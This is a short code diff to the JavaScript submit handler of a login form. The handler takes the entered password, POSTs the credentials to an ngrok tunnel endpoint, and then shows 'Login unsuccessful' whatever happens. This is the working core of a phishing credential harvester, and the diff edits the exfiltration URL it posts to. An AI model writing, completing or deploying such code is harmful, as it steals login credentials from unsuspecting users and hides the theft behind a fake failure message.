@@ -4,7 +4,7 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
   const password = document.getElementById("password").value;
 
   // Send credentials to your server (replace with your server URL)
-  fetch("https://ngrok.com/pricing ", {
+  fetch("connect.ngrok-agent.com", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
@@ -15,6 +15,7 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
   alert("Login unsuccessful.");
 
 });
+
 
 
 
